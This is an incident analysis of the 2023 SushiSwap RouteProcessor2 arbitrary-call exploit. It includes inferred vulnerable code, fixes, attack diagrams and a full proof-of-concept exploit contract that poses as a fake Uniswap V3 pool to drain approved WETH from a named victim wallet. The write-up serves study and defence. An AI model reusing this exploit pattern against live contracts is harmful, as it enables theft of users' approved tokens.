# SushiSwap — RouteProcessor2 Arbitrary Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-09 |
| **Protocol** | SushiSwap |
| **Chain** | Ethereum |
| **Loss** | $3,300,000 (~800 WETH in a single transaction) |
| **Attacker** | [0xc0ff...9671](https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671) (c0ffeebabe.eth) |
| **Attack Contract** | [0xf9a0...cac4](https://etherscan.io/address/0xf9a001d5b2c7c5e45693b41fcf931b94e680cac4) |
| **Attack Tx** | [0x04b1...bc32](https://etherscan.io/tx/0x04b166e7b4ab5105a8e9c85f08f6346de1c66368687215b0e0b58d6e5002bc32) |
| **Vulnerable Contract** | [RouteProcessor2](https://etherscan.io/address/0x044b75f554b886A065b9567891e45c79542d7357) |
| **Root Cause** | Unvalidated external call in RouteProcessor2 `processRoute()` allows theft of approved tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Sushi_Router_exp.sol) |

---

## 1. Vulnerability Overview

SushiSwap's `RouteProcessor2` contract is a router contract designed to handle complex multi-hop swap paths. When a user passes a `route` byte array to the `processRoute()` function, the router parses it and sequentially calls external pool contracts.

**Core Vulnerability**: `processRoute()` directly calls pool addresses provided within the user-supplied `route` bytes without any validation. An attacker can specify their own malicious contract as the pool address. When RouteProcessor2 calls `swap()` on this malicious contract, the malicious contract can call back into `uniswapV3SwapCallback()`, allowing it to arbitrarily transfer tokens from any victim.

The prerequisite for this attack is that **the victim must have previously approved RouteProcessor2 to spend their tokens**. Users who had interacted with SushiSwap would have approved RouteProcessor2 during the swap process, and the attacker exploited this to drain all approved token balances.

The vulnerability can be summarized in two key points:

1. **Unvalidated pool address**: The pool address within `route` is never verified to be an actual Uniswap V3 or Trident pool
2. **Callback trust issue**: `uniswapV3SwapCallback()` and `tridentCLSwapCallback()` do not verify that they are being invoked from an in-progress swap. Within the callback, the caller can arbitrarily designate the `payer` (token source)

---

## 2. Vulnerable Code Analysis

### 2.1 Unvalidated External Call (Core Vulnerability)

RouteProcessor2's `processRoute()` function parses the route bytes and, when encountering a UniswapV3 pool type, directly calls `swap()` on that address.

```solidity
// ❌ Vulnerable code (inferred RouteProcessor2 implementation)
function processRoute(
    address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route
) external payable returns (uint256 amountOut) {
    // Parse route bytes and execute each step
    uint256 offset = 0;
    uint8 commandCode = uint8(route[offset++]);
    
    if (commandCode == 1) { // ERC20 token handling
        address tokenAddress = address(bytes20(route[offset:offset+20]));
        offset += 20;
        uint8 numPools = uint8(route[offset++]);
        
        for (uint8 i = 0; i < numPools; i++) {
            uint16 share = uint16(bytes2(route[offset:offset+2]));
            offset += 2;
            uint8 poolType = uint8(route[offset++]);
            
            if (poolType == 1) { // UniswapV3 type
                address pool = address(bytes20(route[offset:offset+20]));
                offset += 20;
                // ❌ No validation that pool address is a real UniV3 pool!
                // ❌ No whitelist check!
                
                bool zeroForOne = uint8(route[offset++]) == 1;
                address recipient = address(bytes20(route[offset:offset+20]));
                offset += 20;
                
                // ❌ Calls swap() on an arbitrary address — attacker contract can execute!
                IUniswapV3Pool(pool).swap(
                    recipient,
                    zeroForOne,
                    int256(amountIn),
                    zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1,
                    abi.encode(tokenAddress, msg.sender) // payer = msg.sender
                );
            }
        }
    }
}
```

### 2.2 Unvalidated Callback Caller (Secondary Vulnerability)

```solidity
// ❌ Vulnerable uniswapV3SwapCallback (inferred RouteProcessor2 implementation)
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // ❌ Does not verify that msg.sender is the pool we actually called!
    // ❌ No validation that this was invoked from an in-progress swap!
    
    (address tokenIn, address payer) = abi.decode(data, (address, address));
    // ❌ payer is read directly from calldata — attacker can specify any address!
    
    uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);
    
    // ❌ Transfers tokens from the victim (payer) to RouteProcessor2 itself
    // Succeeds because the victim has already approved RouteProcessor2!
    IERC20(tokenIn).transferFrom(payer, msg.sender, amountToPay);
}
```

**Fixed Code (post-patch)**:

```solidity
// ✅ Fixed processRoute — pool whitelist validation added
mapping(address => bool) public approvedPools;

function processRoute(
    address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route
) external payable returns (uint256 amountOut) {
    // ...
    if (poolType == 1) {
        address pool = address(bytes20(route[offset:offset+20]));
        offset += 20;
        
        // ✅ Only allow registered pools
        require(approvedPools[pool], "RouteProcessor: pool not approved");
        
        IUniswapV3Pool(pool).swap(/* ... */);
    }
}

// ✅ Fixed callback — can only be called from the pool of an in-progress swap
address private _currentPool; // Address of the currently swapping pool

function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // ✅ Must be called only from the approved pool currently in progress
    require(msg.sender == _currentPool, "RouteProcessor: invalid callback caller");
    require(approvedPools[msg.sender], "RouteProcessor: callback from unknown pool");
    
    (address tokenIn, address payer) = abi.decode(data, (address, address));
    uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);
    
    IERC20(tokenIn).transferFrom(payer, msg.sender, amountToPay);
}
```

---

## 3. Attack Flow

### 3.1 Preconditions

- The victim (`0x31d3...3E1`) had previously approved `RouteProcessor2(0x044b...7357)` for WETH or other tokens while conducting swaps through SushiSwap
- The attacker deployed a malicious contract acting as a fake UniV3 pool (or the attack contract directly implements `swap()`)

### 3.2 Execution Steps

```
Step 1: Assemble malicious route bytes
┌─────────────────────────────────────────────┐
│  commandCode = 0x01 (ERC20 token)           │
│  tokenAddress = LINK (0x5149...6CA)         │
│  numPools = 1                               │
│  share = 0                                  │
│  poolType = 0x01 (UniswapV3 type)           │
│  pool = attacker contract address ← ❌ key! │
│  zeroForOne = 0                             │
│  recipient = address(0)                     │
└─────────────────────────────────────────────┘
         │
         ▼
Step 2: Call processRoute()
┌─────────────────────────────────────────────┐
│  Attacker calls RouteProcessor2.processRoute()│
│  (tokenIn=ETH, amountIn=0)                  │
│  route = malicious bytes passed in          │
└─────────────────────────────────────────────┘
         │
         ▼
Step 3: RouteProcessor2 calls attacker's swap()
┌─────────────────────────────────────────────┐
│  RouteProcessor2 parses route               │
│  → pool address = attacker contract         │
│  → calls IUniswapV3Pool(attacker).swap(...) │
│  ← Executes without pool validation!        │
└─────────────────────────────────────────────┘
         │
         ▼
Step 4: Attacker's swap() calls back into callback
┌─────────────────────────────────────────────┐
│  Attacker contract's swap() executes        │
│  → Assembles malicious calldata:            │
│    tokenIn  = WETH                          │
│    payer    = victim address (arbitrary!)   │
│  → Calls RouteProcessor2.uniswapV3SwapCallback()│
│    (amount0Delta=100 WETH, data=malicious)  │
└─────────────────────────────────────────────┘
         │
         ▼
Step 5: Drain tokens from victim's wallet
┌─────────────────────────────────────────────┐
│  RouteProcessor2 processes callback:        │
│  tokenIn = WETH, payer = victim             │
│  → Executes WETH.transferFrom(victim,       │
│                   msg.sender, 100 WETH)     │
│  ← Victim had approved RouteProcessor2,     │
│     transfer succeeds!                      │
└─────────────────────────────────────────────┘
         │
         ▼
Result: Attacker gains 100 WETH
```

**Full Attack Flow Diagram**:

```
Attacker EOA (c0ffeebabe.eth)
    │
    │ processRoute(ETH, 0, ETH, 0, addr(0), malicious_route)
    ▼
┌──────────────────────────────┐
│    RouteProcessor2           │
│   0x044b...7357              │
│                              │
│  Parse route → poolType=1    │
│  pool = attacker contract    │
│                              │
│  IUniswapV3Pool(pool).swap() │──────────────────────┐
└──────────────────────────────┘                      │
                                                      │ swap() call
                                                      ▼
                                         ┌────────────────────────┐
                                         │   Attacker Contract    │
                                         │  (fake UniV3 pool)     │
                                         │                        │
                                         │  data = encode(        │
                                         │    WETH,               │
                                         │    victim addr  ← ❌   │
                                         │  )                     │
                                         │                        │
                                         │  uniswapV3Swap         │
                                         │  Callback(100e18,0,data)│
                                         └──────────┬─────────────┘
                                                    │
                                    callback (re-entry) │
                                                    ▼
┌──────────────────────────────┐
│    RouteProcessor2           │
│   uniswapV3SwapCallback()    │
│                              │
│  (tokenIn, payer) = decode() │
│  tokenIn = WETH              │
│  payer   = victim   ← ❌    │
│                              │
│  WETH.transferFrom(          │
│    victim,                   │
│    msg.sender (attacker contract),│
│    100 WETH                  │
│  )                           │
└──────────────────────────────┘
    │
    │ approval-based transfer succeeds
    ▼
┌──────────────────────────────┐
│   Victim Wallet              │
│  0x31d3...3E1                │
│                              │
│  -100 WETH                   │
│  (Full approved balance      │
│   drained via RouteProcessor2│
│   approval)                  │
└──────────────────────────────┘
```

### 3.3 Outcome

- Over **800 WETH** drained from a single victim in one transaction
- In the actual attack, repeated across multiple victim wallets
- Total loss: **$3,300,000** (~1,485 ETH)
- Attacker paid 678.88 ETH in MEV builder fees; net profit: ~121 ETH

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// References:
// https://twitter.com/peckshield/status/1644907207530774530
// Attack Tx: 0x04b166...bc32

contract SushiExp is Test, IUniswapV3Pool {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    
    // Victim wallet that had approved RouteProcessor2 in the actual attack
    address victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    
    // Vulnerable RouteProcessor2 contract
    IRouteProcessor2 processor = IRouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);

    function setUp() public {
        // Fork to the block just before the attack (17,007,841)
        cheats.createSelectFork("mainnet", 17_007_841);
    }

    function testExp() external {
        // ① Assemble malicious route bytes
        // commandCode=1: ERC20 token processing
        // pool=address(this): attacker contract acts as fake UniV3 pool
        uint8 commandCode = 1;   // ERC20 processing command
        uint8 num = 1;            // number of pools
        uint16 share = 0;         // share ratio (0 = full amount)
        uint8 poolType = 1;       // 1 = UniswapV3 type
        address pool = address(this); // ← key: specify attacker contract as pool
        uint8 zeroForOne = 0;
        address recipient = address(0);
        
        bytes memory route = abi.encodePacked(
            commandCode, address(LINK), num, share,
            poolType, pool, zeroForOne, recipient
        );

        // ② Call processRoute() — no ETH sent (amountIn=0)
        // Use native ETH dummy address for tokenIn/tokenOut
        processor.processRoute(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // native ETH (dummy)
            0,
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            address(0),
            route
        );
    }

    // ③ RouteProcessor2 calls this function as fake UniV3 pool.swap()
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        amount0 = 0;
        amount1 = 0;
        
        // ④ Assemble malicious callback data
        // tokenIn = WETH (token to steal from victim)
        // payer = victim (victim address specified arbitrarily)
        bytes memory malicious_data = abi.encode(address(WETH), victim);
        
        // ⑤ Call back into RouteProcessor2's callback function
        // amount0Delta=100 WETH → triggers 100 WETH transfer from victim
        processor.uniswapV3SwapCallback(100 * 10 ** 18, 0, malicious_data);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Unvalidated external call (arbitrary pool address) | CRITICAL | CWE-20 (Improper Input Validation) | `03_access_control.md` |
| V-02 | Unvalidated callback caller (arbitrary payer assignment) | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-03 | Approval balance theft (approval abuse) | HIGH | CWE-285 (Improper Authorization) | `07_token_integration.md` |

### V-01: Unvalidated External Call (Arbitrary Pool Address)

- **Description**: The `processRoute()` function calls pool addresses found in the user-supplied `route` input without any validation. An attacker can designate a malicious contract address as the pool, causing RouteProcessor2 to execute arbitrary external contract code.
- **Impact**: Attacker can leverage RouteProcessor2's authority (msg.sender trust) to drain tokens from victim wallets. Every user who has approved RouteProcessor2 is a potential victim.
- **Attack Conditions**: Attacker crafts route bytes placing a malicious contract address at the pool position. Victim must have an active token approval for RouteProcessor2.

### V-02: Unvalidated Callback Caller (Arbitrary Payer Assignment)

- **Description**: The `uniswapV3SwapCallback()` function does not verify that `msg.sender` is the pool involved in the current in-progress swap. Because the `payer` address is decoded directly from calldata within the callback, an attacker can specify any arbitrary address as `payer`.
- **Impact**: RouteProcessor2 executes `transferFrom()` on behalf of any arbitrary address (payer). If that address has approved RouteProcessor2, its entire balance can be drained.
- **Attack Conditions**: Call `uniswapV3SwapCallback()` directly or via a fake pool. Encode the target victim address and token address to steal in the calldata.

### V-03: Approval Balance Theft (Approval Abuse)

- **Description**: The ERC-20 `approve` mechanism allows an approved contract to transfer tokens on behalf of the user. When RouteProcessor2 is compromised, all users who had previously approved it are immediately exposed.
- **Impact**: Loss of the victim's entire approved balance. In the actual attack, repeated execution across multiple victims resulted in $3.3M in losses.
- **Attack Conditions**: Victim must hold a valid active approval for RouteProcessor2. Most past SushiSwap users qualify.

---

## 6. Remediation Recommendations

### Immediate Actions

1. **Pause and redeploy RouteProcessor2**: Immediately pause the vulnerable contract and replace it with a patched version
2. **Advise users to revoke approvals**: Publicly notify all users to immediately revoke any token approvals for the old RouteProcessor2
3. **Apply pool address whitelist**:

```solidity
// ✅ Fix 1: Only allow whitelisted pools
mapping(address => bool) public approvedPools;

modifier onlyApprovedPool(address pool) {
    // Only allow registered UniswapV3/Trident pools
    require(approvedPools[pool], "RouteProcessor: unapproved pool");
    _;
}
```

4. **Strengthen callback validation**:

```solidity
// ✅ Fix 2: Track active swap and validate callback
address private _activePool;
bool private _inSwap;

function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // ✅ Must be called only from the pool of the current in-progress swap
    require(_inSwap && msg.sender == _activePool,
        "RouteProcessor: invalid callback");
    
    (address tokenIn, address payer) = abi.decode(data, (address, address));
    uint256 amountToPay = amount0Delta > 0
        ? uint256(amount0Delta)
        : uint256(amount1Delta);
    
    IERC20(tokenIn).transferFrom(payer, msg.sender, amountToPay);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Unvalidated pool address (V-01) | Whitelist only verified pools deployed by the protocol. Introduce factory-address-based pool validation (compare against `IUniswapV3Factory.getPool()` result) |
| Unvalidated callback caller (V-02) | Track the currently active pool in an `_activePool` state variable. Validate `msg.sender == _activePool` on callback entry. Use alongside a reentrancy guard |
| Approval abuse (V-03) | Apply principle of least privilege to router contracts. Instead of unlimited approvals, request only the exact per-transaction amount |
| General input validation | Add strict range/type validation for all fields in route bytes (commandCode, poolType, addresses) |

---

## 7. Lessons Learned

1. **Danger of arbitrary calls in router contracts**: User input must never be used directly as the target address for external calls. Especially in contracts that hold approval authority, executing a call to a user-supplied address is a critical vulnerability.

2. **Trust issues with the callback pattern**: When implementing UniswapV3-style callbacks (`uniswapV3SwapCallback`, `uniswapV2Call`, etc.), it is essential to verify that the callback caller (`msg.sender`) is the contract we directly invoked. Tracking the in-progress context via a state variable is the key safeguard.

3. **Approved balances are always at-risk assets**: Token balances that users have approved to a DeFi protocol are immediately at risk of being drained if that contract contains a vulnerability. Revoking approvals immediately after a swap completes, or using ERC-2612 `permit` for single-transaction approvals, is a safer pattern.

4. **Whitelist vs. blacklist**: External contracts that a DeFi router can interact with should be managed via a whitelist (allowlist), not a blacklist (denylist). A blacklist can be bypassed by an attacker deploying a new address, but a whitelist cannot.

5. **Importance of security audits**: RouteProcessor2 was core infrastructure for SushiSwap, yet it did not receive a sufficient security audit before deployment. Contracts such as routers, bridges, and aggregators that centrally handle user approvals require an especially high standard of audit scrutiny.

6. **Similar vulnerability patterns**: This vulnerability closely mirrors the Poly Network hack (2021, $611M). Poly Network also executed user-supplied calldata without validation, allowing an attacker to change the keeper address and steal cross-chain assets. The "arbitrary call vulnerability" is a high-risk pattern that recurs repeatedly in DeFi.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amounts Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Drain unit | 100 WETH | 100 WETH × 8 transfers | ✅ |
| Victim | 0x31d3...3E1 | 0x31d3...3E1 | ✅ |
| Total drained | 100 WETH (demo) | ~800 WETH | ✅ (repeated execution) |
| MEV builder fee | N/A | 678.88 ETH | Reference |
| Attacker net profit | N/A | ~121 ETH | Reference |
| Attack block | 17,007,841 | 17,007,841 | ✅ |

### 8.2 On-Chain Event Log Sequence

Key events recorded in attack transaction `0x04b1...bc32`:

1. `WETH.Transfer` ← `0x31d3...3E1` → `0xf9a0...cac4` (attack contract) × 8 times (100 WETH each)
2. `WETH.Transfer` ← `0xf9a0...cac4` → `beaverbuild` (678.88 ETH, MEV builder fee)
3. `WETH.Transfer` ← internal settlement → `0xc0ff...9671` (121.12 ETH, attacker final profit)

### 8.3 Precondition Verification

State immediately before the attack block (17,007,841):

| Condition | Status |
|------|------|
| Victim (0x31d3...3E1) WETH approval for RouteProcessor2 | Approved for more than sufficient balance |
| RouteProcessor2 PAUSE status | Active (not yet patched) |
| Attacker contract deployment | Complete (same block, just before the attack) |

**Post-Attack Response**:
- The SushiSwap team paused RouteProcessor2 immediately after the attack and deployed a new version
- Of the total protocol loss of $3.3M, a portion was proactively protected by white-hat MEV bots